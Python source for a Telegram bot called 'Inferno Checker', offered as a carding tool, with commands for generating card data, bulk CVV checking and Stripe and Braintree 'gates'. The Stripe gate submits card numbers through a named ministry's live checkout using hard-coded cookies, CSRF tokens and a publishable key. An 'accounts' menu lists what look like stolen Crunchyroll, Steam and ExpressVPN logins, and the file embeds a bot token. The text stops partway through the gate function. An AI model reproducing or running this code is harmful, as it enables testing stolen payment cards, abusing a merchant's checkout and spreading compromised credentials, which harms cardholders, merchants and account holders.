import telebot
from telebot import types
import asyncio
import aiohttp
import replicate
from user_agent import generate_user_agent
from queue import Queue
import requests
import threading
from threading import Thread, Lock
import json
import os
import base64
import html
import time
import datetime
import random
import string
import sqlite3
import re
import logging
from io import BytesIO
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from yt_dlp import YoutubeDL

# Initialize the bot using the provided token
bot = telebot.TeleBot("7870285697:AAH3NCAwSON1nKsbwDsRum7YfEfG7flFNn4")

# Setup logging
logging.basicConfig(filename='bot_errors.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize the request queue
request_queue = Queue()  # Ensure this is defined before process_requests

# Database setup
conn = sqlite3.connect('user_data.db', check_same_thread=False)
db_lock = Lock()

def get_cursor():
    return conn.cursor()

def setup_database():
    with db_lock:
        cursor = get_cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                            user_id INTEGER PRIMARY KEY,
                            first_name TEXT,
                            last_name TEXT,
                            rank TEXT DEFAULT 'FREE',
                            credits INTEGER DEFAULT 10,
                            premium_until TEXT
                        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS api_keys (
                            id INTEGER PRIMARY KEY,
                            api_key TEXT
                        )''')
        conn.commit()

setup_database()

# Database setup for Bearer token
token_conn = sqlite3.connect('token.db', check_same_thread=False)
token_db_lock = Lock()

def setup_token_database():
    with token_db_lock:
        cursor = token_conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS bearer_tokens (
                            id INTEGER PRIMARY KEY,
                            token TEXT
                        )''')
        token_conn.commit()

setup_token_database()

def set_bearer_token(new_token):
    with token_db_lock:
        cursor = token_conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO bearer_tokens (id, token) VALUES (1, ?)", (new_token,))
        token_conn.commit()

def get_bearer_token():
    with token_db_lock:
        cursor = token_conn.cursor()
        cursor.execute("SELECT token FROM bearer_tokens WHERE id = 1")
        result = cursor.fetchone()
        return result[0] if result else None

# Define the owner ID
OWNER_ID = 706483179

# Dictionary to temporarily store file paths for users
uploaded_files = {}

# Session management with retry strategy
session = requests.Session()
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[429, 500, 502, 503, 504],
)
adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)
session.mount("https://", adapter)

def set_api_key(new_key):
    with db_lock:
        cursor = get_cursor()
        # Log the current API key before updating
        cursor.execute("SELECT api_key FROM api_keys WHERE id = 1")
        current_key = cursor.fetchone()
        logging.info(f"Current API key before update: {current_key}")

        # Update or insert the new API key
        cursor.execute("INSERT OR REPLACE INTO api_keys (id, api_key) VALUES (1, ?)", (new_key,))
        conn.commit()

        # Log the new API key after updating
        cursor.execute("SELECT api_key FROM api_keys WHERE id = 1")
        updated_key = cursor.fetchone()
        logging.info(f"Updated API key: {updated_key}")

def get_api_key():
    with db_lock:
        cursor = get_cursor()
        cursor.execute("SELECT api_key FROM api_keys WHERE id = 1")
        result = cursor.fetchone()
        logging.info(f"Retrieved API key: {result}")
        return result[0] if result else None

# Helper function for long messages
def send_long_message(chat_id, message):
    for i in range(0, len(message), 4096):
        bot.send_message(chat_id, message[i:i + 4096])


# Error handling for uncaught exceptions
def handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    logging.error("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))


# Set global exception handler
import sys

def handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    logging.error("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))

sys.excepthook = handle_exception

# Function to execute database queries safely
def execute_query(query, params=()):
    try:
        with db_lock:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
    except Exception as e:
        logging.error(f"Database error: {str(e)}")
        conn.rollback()
    finally:
        cursor.close()

# Function to send messages to Telegram with backoff strategy
def send_with_backoff(method, *args, **kwargs):
    while True:
        try:
            return method(*args, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                wait_time = int(e.result_json.get('parameters', {}).get('retry_after', 1))
                logging.warning(f"Rate limit hit. Retrying in {wait_time} seconds.")
                time.sleep(wait_time)
            else:
                logging.error(f"API Telegram Exception: {str(e)}")
                raise


# Function to validate URLs
def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|localhost|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|\[?[A-F0-9]*:[A-F0-9:]+\]?)'
        r'(?::\d+)?(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Function to find payment gateways in response
def find_payment_gateways(response_text):
    payment_gateways = [
        "paypal", "stripe", "braintree", "square", "cybersource", "authorize.net", "2checkout",
        "adyen", "worldpay", "sagepay", "checkout.com", "shopify", "razorpay", "bolt", "paytm", 
        "venmo", "pay.google.com", "revolut", "eway", "woocommerce", "upi", "apple.com", "payflow", 
        "payeezy", "paddle", "payoneer", "recurly", "klarna", "paysafe", "webmoney", "payeer", 
        "payu", "skrill", "affirm", "afterpay", "dwolla", "global payments", "moneris", "nmi", 
        "payment cloud", "paysimple", "paytrace", "stax", "alipay", "bluepay", "paymentcloud", 
        "clover", "zelle", "google pay", "cashapp", "wechat pay", "transferwise", "stripe connect", 
        "mollie", "sezzle", "afterpay", "payza", "gocardless", "bitpay", "sureship", 
        "conekta", "fatture in cloud", "payzaar", "securionpay", "paylike", "nexi", 
        "kiosk information systems", "adyen marketpay", "forte", "worldline", "payu latam"
    ]
    
    detected_gateways = []
    for gateway in payment_gateways:
        if gateway in response_text.lower():
            detected_gateways.append(gateway.capitalize())
    return detected_gateways

# Function to check captcha presence
def check_captcha(response_text):
    captcha_keywords = {
        'recaptcha': ['recaptcha', 'google recaptcha'],
        'image selection': ['click images', 'identify objects', 'select all'],
        'text-based': ['enter the characters', 'type the text', 'solve the puzzle'],
        'verification': ['prove you are not a robot', 'human verification', 'bot check'],
        'security check': ['security check', 'challenge'],
        'hcaptcha': [
            'hcaptcha', 'verify you are human', 'select images', 
            'cloudflare challenge', 'anti-bot verification', 'hcaptcha.com',
            'hcaptcha-widget', 'solve the puzzle', 'please verify you are human'
        ]
    }

    detected_captchas = []
    for captcha_type, keywords in captcha_keywords.items():
        for keyword in keywords:
            if re.search(rf'\b{re.escape(keyword)}\b', response_text, re.IGNORECASE):
                if captcha_type not in detected_captchas:
                    detected_captchas.append(captcha_type)

    if re.search(r'<iframe.*?src=".*?hcaptcha.*?".*?>', response_text, re.IGNORECASE):
        if 'hcaptcha' not in detected_captchas:
            detected_captchas.append('hcaptcha')

    return ', '.join(detected_captchas) if detected_captchas else 'No captcha detected'

# Function to check URL and gather information
def check_url(url):
    if not is_valid_url(url):
        return [], 400, "Invalid", "Invalid", "Invalid URL", "N/A", "N/A"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Referer': 'https://www.google.com'
    }

    try:
        response = session.get(url, headers=headers, timeout=10)
        
        if response.status_code == 403:
            for attempt in range(3):
                time.sleep(2 ** attempt)
                response = session.get(url, headers=headers, timeout=10)
                if response.status_code != 403:
                    break

        if response.status_code == 403:
            return [], 403, "403 Forbidden: Access Denied", "N/A", "403 Forbidden", "N/A", "N/A"
        
        response.raise_for_status()
        detected_gateways = find_payment_gateways(response.text)
        captcha_type = check_captcha(response.text)
        gateways_str = ', '.join(detected_gateways) if detected_gateways else "None"

        return detected_gateways, response.status_code, captcha_type, "None", "2D (No extra security)", "N/A", "N/A"

    except requests.exceptions.HTTPError as http_err:
        return [], 500, "HTTP Error", "N/A", f"HTTP Error: {str(http_err)}", "N/A", "N/A"
    except requests.exceptions.RequestException as req_err:
        return [], 500, "Request Error", "N/A", f"Request Error: {str(req_err)}", "N/A", "N/A"

@bot.message_handler(func=lambda message: message.text.startswith(('/start', '.start')))
def handle_start(message):
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name or ''

        execute_query("INSERT OR IGNORE INTO users (user_id, first_name, last_name, rank, credits) VALUES (?, ?, ?, 'FREE', 10)",
                      (user_id, first_name, last_name))

        today_date = datetime.datetime.now().strftime("%d - %m - %Y")

        welcome_message = (
            "-------------\n"
            f"[↯]𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 Inferno 「 ∅ 」\n"
            f"[↯] AN ADVANCE TOOL FOR EVERYONE\n"
            f"[↯] 𝐏𝐫𝐞𝐬𝐬 /register\n"
            f"------------------------------------\n"
            f"[↯] Today date( {today_date})\n"
            f"[↯] BEST AND EASY TO USE [NO PRICING]\n"
            f"-------------------------------------\n"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik\n"
        )

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(" 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ", url="https://t.me/+hkGFESdljs45OTdl"))

        bot.reply_to(message, welcome_message, reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /start command: {str(e)}")
        bot.reply_to(message, "An error occurred. Please try again later.")

@bot.message_handler(func=lambda message: message.text.startswith(('/register', '.register')))
def handle_register(message):
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name or ''

        execute_query("INSERT OR IGNORE INTO users (user_id, first_name, last_name, rank, credits) VALUES (?, ?, ?, 'FREE', 250)",
                      (user_id, first_name, last_name))

        today_date = datetime.datetime.now().strftime("%d - %m - %Y")

        register_message = (
            f"[↯] YOU HAVE BEEN SUCCCESSFULLY REGISTERED\n"
            f"[↯] YOU CAN CHECK ALL THE TOOLS AND GATES\n"
            f"----------------------------\n"
            f"[↯] 𝐔𝐬𝐞𝐫 𝐈𝐃 : {user_id}\n"
            f"[↯] JUST TYPE /cmds TO SEE OUR WORK\n"
            f"----------------------------\n"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik\n"
        )

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("CHANNEL", url="https://t.me/+hkGFESdljs45OTdl"))

        bot.reply_to(message, register_message, reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /register command: {str(e)}")
        bot.reply_to(message, "An error occurred. Please try again later.")

@bot.message_handler(func=lambda message: message.text.startswith(('/ping', '.ping')))
def handle_ping(message):
    initial_message = bot.reply_to(message, "Checking Ping...📌")
    
    # Measure the ping
    start_time = time.time()
    time.sleep(0.1)  # Simulate a delay
    end_time = time.time()
    
    # Calculate the ping in milliseconds
    ping = (end_time - start_time) * 1000
    network_speed = 100  # Placeholder value for network speed in Mbps
    
    response = (
        f"[↯] Bot Status: Running ✅\n"
        f"[↯] Ping: {ping:.2f} ms\n"
        f"[↯] Network Speed: {network_speed} Mbps"
    )
    
    bot.edit_message_text(response, chat_id=initial_message.chat.id, message_id=initial_message.message_id)

# Dictionary to store the last known message content by chat_id and message_id
message_cache = {}

# Main menu message
def send_main_menu(chat_id, message_id):
    main_message = (
        f" Inferno Checker 「 ∅ 」:\n\n"
        f"[↯] 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐜𝐭𝐢𝐯𝐞 ✅\n\n"
        f"[↯] 𝐈𝐟 𝐁𝐎𝐓 𝐃𝐞𝐭𝐞𝐜𝐭 𝐛𝐚𝐝 𝐛𝐞𝐡𝐚𝐯𝐢𝐨𝐫 𝐁𝐎𝐓 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐚𝐮𝐭𝐨 𝐁𝐚𝐧.\n"
        f"[↯] 𝐝𝐨𝐧'𝐭 𝐤𝐧𝐨𝐰 𝐜𝐦𝐝 𝐫𝐞𝐚𝐝 𝐜𝐚𝐫𝐞𝐟𝐮𝐥𝐥𝐲 𝐮𝐬𝐞𝐝 𝐜𝐦𝐝𝐬.\n\n"
        f"[↯] 𝐅𝐨𝐫 𝐚𝐧𝐧𝐨𝐮𝐧𝐜𝐞𝐦𝐞𝐧𝐭𝐬 𝐚𝐧𝐝 𝐮𝐩𝐝𝐚𝐭𝐞𝐬, \n\n"
        f"[↯] 𝐓𝐨𝐝𝐚𝐲 𝐝𝐚𝐭𝐞({datetime.datetime.now().strftime('%d - %m - %Y')}) 🇯🇵"
    )

    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("TOOLS", callback_data="tools"),
        InlineKeyboardButton("GATES", callback_data="gateway"),
        InlineKeyboardButton("ACCOUNTS", callback_data="acc"),
        InlineKeyboardButton("REPORT", callback_data="rep")
    )

    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != main_message:
        try:
            bot.edit_message_text(main_message, chat_id=chat_id, message_id=message_id, reply_markup=markup, parse_mode='Markdown')
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = main_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e) or "message can't be edited" in str(e):
                print("Message not found or can't be edited.")
            else:
                raise

# Tools menu message
def send_tools_menu(chat_id, message_id):
    tools_message = (
        " Inferno Checker 「 ∅ 」:\n\n"
        "✨ TOOLS ✨\n\n"
        "--------------- BIN ----------------\n"
        "[↯] /bin - Check bin status effortlessly.\n"
        "[↯] /gen - Generate credit card data quickly.\n"
        "[↯] /url - Single URL analyzer.\n"
        "[↯] /murl - Multi-URL analyzer.\n"
        "[↯] /sk - Generate sk key\n"
        "[↯] /sk no - Generate sk key [MASS]\n"
        "[↯] /iban - Ibban Generator.\n"
        "--------------- BASIC  ----------------\n"
        "[↯] /proxy - Proxy Checker.\n"
        "[↯] /ping - Bot status checker.\n"
        "[↯] /img - Create an anime image with ease.\n"
        "[↯] /info - See your account status, rank, credits, and premium level.\n"
    )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("𝗛𝗢𝗠𝗘 ", callback_data="home"))
    
    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != tools_message:
        try:
            bot.edit_message_text(tools_message, chat_id=chat_id, message_id=message_id, reply_markup=markup)
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = tools_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e):
                print("Message to edit not found.")
            else:
                raise

    
    # account menu message
def send_acc_menu(chat_id, message_id):
    acc_message = (
        " Inferno Checker 「 ∅ 」:\n\n"
        "✨ ACCOUNTS ✨\n\n"
        "<----------- CUNCHYROLL ----------->\n\n"
        "[↯]  Taisiralways@gmail.com : Taisir@2303 \n\n"
        "<----------- STEAM-----------\n\n"
        "[↯]  avellmtz : jesus1801  \n\n"
        "[↯]  max12188' : 'aneki18 \n\n"
        "[↯]  sheyouan : ASD950202 \n\n"
        "<----------- NETFLIX----------->\n\n"
        "[↯]   NOT AVALIABLE \n\n"
        "<-----------EXPRESS VPN ----------->\n\n"
        "[↯]  d84643237@gmail.com : Expressvpn2024* \n\n"
        "[↯]  Ter_kaly@hotmail.com : @666229aA \n\n"       
           )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("𝗛𝗢𝗠𝗘 ", callback_data="home"))
    
    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != acc_message:
        try:
            bot.edit_message_text(acc_message, chat_id=chat_id, message_id=message_id, reply_markup=markup)
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = acc_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e):
                print("Message to edit not found.")
            else:
                raise
    
    # REPORT menu message
def send_rep_menu(chat_id, message_id):
    rep_message = (
        f" Inferno Checker 「 ∅ 」:\n\n"
        f"✨ TOOLS ✨\n\n"
        f"<--------------- REPORT ---------------->\n"
        f"[↯] IF YOU HAVE ANY PROBLEM CONTACT US \n"
        f"[↯] THIS IS A FREE BOT WHICH PROVIDES YOU EVERYTHING IN FREE \n"
        f"[↯] IF YOU WANT TO REMOVE ANY COPYRIGHTED CONTENT D.M\n"
        f"<--------------- OWNERS---------------->\n"
        f"[↯] OWNERS OF BOT @Taisirshaik , @Spyboy_pvts\n"
        f"[↯] JUST CONTACT US , WELL RESPOND IN SHORT TIME\n"
    )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("𝗛𝗢𝗠𝗘 ", callback_data="home"))


    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != rep_message:
        try:
            bot.edit_message_text(rep_message, chat_id=chat_id, message_id=message_id, reply_markup=markup)
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = rep_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e):
                print("Message to edit not found.")
            else:
                raise

# Gateway menu message
def send_gateway_menu(chat_id, message_id):
    gateway_message = (
        f" Inferno Checker 「 ∅ 」:\n\n"
        f"✨ GATEWAY ✨\n\n"
        f"[↯] /chk - Stripe card checker.\n"
        f"[↯] /mchk - Bulk card checker (Premium only).\n"
        f"[↯] /combo - CVV file processor.\n"
        f"[↯] /b3 - Braintree card checker.\n"
        )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("HOME", callback_data="home"))

    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != gateway_message:
        try:
            bot.edit_message_text(gateway_message, chat_id=chat_id, message_id=message_id, reply_markup=markup)
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = gateway_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e):
                print("Message to edit not found.")
            else:
                raise


# Handle /cmds command
@bot.message_handler(func=lambda message: message.text.startswith(('/cmds', '.cmds')))
def handle_cmds(message):
    chat_id = message.chat.id
    message_id = message.message_id
    bot.send_message(chat_id, "Loading menu...", reply_markup=None)  # Send an initial message
    send_main_menu(chat_id, message_id + 1)  # Edit the message to show the menu

# Callback handler for inline buttons
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if call.data == "tools":
        send_tools_menu(chat_id, message_id)
    elif call.data == "gateway":
        send_gateway_menu(chat_id, message_id)
    elif call.data == "buy":
        send_buy_menu(chat_id, message_id)
    elif call.data == "acc":
        send_acc_menu(chat_id, message_id)
    elif call.data == "rep":
        send_rep_menu(chat_id, message_id)
    elif call.data == "home":
        send_main_menu(chat_id, message_id)

    # Important to stop spinning loader on button
    bot.answer_callback_query(call.id)

def is_authorized(user_id):
    return user_id == OWNER_ID or is_admin(user_id)

def is_admin(user_id):
    cursor = get_cursor()
    cursor.execute("SELECT rank FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    return user and user[0] == 'ADMIN'

def determine_rank(rank, premium_until):
    if premium_until and time.strptime(premium_until, '%Y-%m-%d') > time.localtime():
        return rank if rank != 'FREE' else 'PREMIUM'
    return rank

cancel_process = False

# Enhanced /watch command with Cancel button
@bot.message_handler(func=lambda message: message.text.startswith(('/watch', '.watch')))
def handle_watch(message):
    global cancel_process
    cancel_process = False  # Reset cancel flag for new process

    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "Authorization required to execute this command.")
        return

    cursor = get_cursor()
    cursor.execute("SELECT user_id, first_name, last_name, rank, credits, premium_until FROM users")
    users = cursor.fetchall()

    if not users:
        bot.reply_to(message, "No users found.")
        return

    batch_size = 3
    keyboard = InlineKeyboardMarkup()
    cancel_button = InlineKeyboardButton("Cancel ✖️", callback_data="cancel")
    keyboard.add(cancel_button)

    for i in range(0, len(users), batch_size):
        if cancel_process:
            bot.send_message(message.chat.id, "Process cancelled.")
            return

        batch = users[i:i + batch_size]
        message_text = "[↯] 👥 User Details:\n"
        for user in batch:
            user_id, first_name, last_name, rank, credits, premium_until = user
            actual_rank = determine_rank(rank, premium_until)
            message_text += (
                f" ↯ User ID: {user_id}\n"
                f" ↯ Name: {first_name} {last_name}\n"
                f"--------------------------------------\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik\n"
            )

        # Send or edit the message with each batch
        if i == 0:
            msg = bot.send_message(message.chat.id, message_text, reply_markup=keyboard)
        else:
            bot.edit_message_text(message_text, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)

        time.sleep(15)  # Wait 15 seconds before processing the next batch

    # Final message update
    if not cancel_process:
        bot.edit_message_text("End of Batch", chat_id=msg.chat.id, message_id=msg.message_id)
        time.sleep(5)  # Wait a few seconds before deletion
        bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)

# Callback query handler for cancel button
@bot.callback_query_handler(func=lambda call: call.data == "cancel")
def handle_cancel(call):
    global cancel_process
    cancel_process = True
    bot.edit_message_text("Process cancelled.", chat_id=call.message.chat.id, message_id=call.message.message_id)

# Enhanced /info command
@bot.message_handler(func=lambda message: message.text.startswith(('/info', '.info')))
def handle_info(message):
    user_id = message.from_user.id
    cursor = get_cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()

    if user:
        rank = determine_rank(user[3], user[5])
        response = (
            f"[✮]  Account Details 🎖️\n"
            f"[✮] First Name: {user[1]}\n"
            f"[✮] Last Name: {user[2]}\n"
            f"[✮] User ID: {user[0]}\n"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik\n"
        )
    else:
        response = "User not found in our database. Please use /register."

    bot.reply_to(message, response)

# Handle /setrank command
@bot.message_handler(func=lambda message: message.text.startswith(('/setrank', '.setrank')))
def handle_setrank(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split(maxsplit=2)  # Correct parsing of rank and user_id
        if len(parts) < 3:
            bot.reply_to(message, "Please provide a new rank and a user ID (e.g., /setrank NEW_RANK user_id).")
            return

        new_rank = parts[1]  # Rank is the second argument
        user_id = int(parts[2])  # User ID is the third argument

        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank=? WHERE user_id=?", (new_rank, user_id))
        conn.commit()
        bot.reply_to(message, f"User {user_id} rank updated to {new_rank}.")
    except ValueError:
        bot.reply_to(message, "Invalid input. Please ensure the user ID is a number.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
        
# Handle /rem command
@bot.message_handler(func=lambda message: message.text.startswith(('/rem', '.rem')))
def handle_remove_premium(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to remove premium status.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='FREE', premium_until=NULL WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"Premium status removed from user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
        

@bot.message_handler(func=lambda message: message.text.startswith(('/adminadd', '.adminadd')))
def handle_addadmin(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to promote.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='ADMIN' WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"User {user_id} THIS USER HAS BEEN PROMOTED TO ADMINS")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# Handle /remrank command
@bot.message_handler(func=lambda message: message.text.startswith(('/rankrem', '.rankrem')))
def handle_remove_custom_rank(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to remove custom rank.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='FREE' WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"Custom rank removed from user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
        
        
@bot.message_handler(func=lambda message: message.text.startswith(('/adminrem', '.adminrem')))
def handle_remadmin(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to remove admin privileges.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='FREE' WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"Admin privileges removed from user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

#stripe 1$ GATE
def process_card(card_info, user_id):
    try:
       
       # Skip credit check and deduction - credits removed
        cursor = get_cursor()
        cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
        user = cursor.fetchone()

        if not user:  # Check if user exists
            return "User not registered. Please register to use this feature."

        start_time = time.time()

        # Extract card details
        card_number, card_exp_month, card_exp_year, card_cvc = card_info.split('|')

        # Convert the expiration year to a two-digit format if necessary
        if len(card_exp_year) == 4:
            card_exp_year = card_exp_year[2:]

        # Set up the request for the Stripe API
        stripe_url = 'https://api.stripe.com/v1/payment_methods'
        stripe_headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
        stripe_data = f'type=card&billing_details[name]=AntifiedNull&billing_details[email]=antifiednull945%40gmail.com&billing_details[address][line1]=AntifiedNull&billing_details[address][city]=New+York&billing_details[address][state]=New+York&billing_details[address][country]=US&billing_details[address][postal_code]=10080&card[number]={card_number}&card[cvc]={card_cvc}&card[exp_month]={card_exp_month}&card[exp_year]={card_exp_year}&guid=796f3dc4-af38-471f-8523-477f0170a071e1f637&muid=618b8b71-7516-4bd7-ba5c-c3d1162597f09d162b&sid=8b04681f-a367-4102-a8ba-bbc4c2470c1b51097b&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+split-card-element&referrer=https%3A%2F%2Fwww.giftofgodministry.com&time_on_page=80642&key=pk_live_nyPnaDuxaj8zDxRbuaPHJjip&_stripe_account=acct_1OT7NLG8WC78DVHv&_stripe_version=2020-03-02'


        # Send the request to Stripe
        stripe_response = requests.post(stripe_url, headers=stripe_headers, data=stripe_data)
        stripe_response_data = stripe_response.json()

        # Retrieve the payment ID and additional card information
        payment_id = stripe_response_data.get('id', None)
        card_info = stripe_response_data.get('card', {})
        country = card_info.get('country', 'Unknown')
        type = card_info.get('funding', 'Unknown')
        brand = card_info.get('brand', 'Unknown')
        bin_number = card_number[:6]

        if not payment_id:
            return f"INCORRECT CARD NUMBER / EXPIRY\n\n CARD NUMER : {card_number} \n EXPIRY : {card_exp_month}/{card_exp_year} \n CVV : {card_cvc} "

        # Perform an additional API call using the payment ID
        other_url = "https://www.giftofgodministry.com/.wf_graphql/apollo"
        other_headers = {
            'authority': 'www.giftofgodministry.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'cookie': '__stripe_mid=618b8b71-7516-4bd7-ba5c-c3d1162597f09d162b; __stripe_sid=8b04681f-a367-4102-a8ba-bbc4c2470c1b51097b; wf-order-id=c9339296-70e9-46c5-b98a-3d0c91dcb645; wf-order-id.sig=sHdqhTITb5lkVJt2rbyQRRLkQRP-b_vtEVK6Sw1BPps; wf-csrf=c-Z15S6kXTkUyzO1UPRb_-qy2yZ4WAZQ8h5bbjW2VK-d; wf-csrf.sig=wFHQduRnat_YL8NCyWA85BpDJ2ARCuYuZ_sBKJQ2bTA',
            'origin': 'https://www.giftofgodministry.com',
            'referer': 'https://www.giftofgodministry.com/checkout',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-wf-csrf': 'c-Z15S6kXTkUyzO1UPRb_-qy2yZ4WAZQ8h5bbjW2VK-d',
        }

        other_data = [
            {
                'operationName': 'CheckoutUpdateStripePaymentMethod',
                'variables': {
                    'paymentMethod': payment_id,
                },
                'query': 'mutation CheckoutUpdateStripePaymentMethod($paymentMethod: String!) {\n  ecommerceStoreStripePaymentMethod(paymentMethod: $paymentMethod) {\n    ok\n    __typename\n  }\n}',
            },
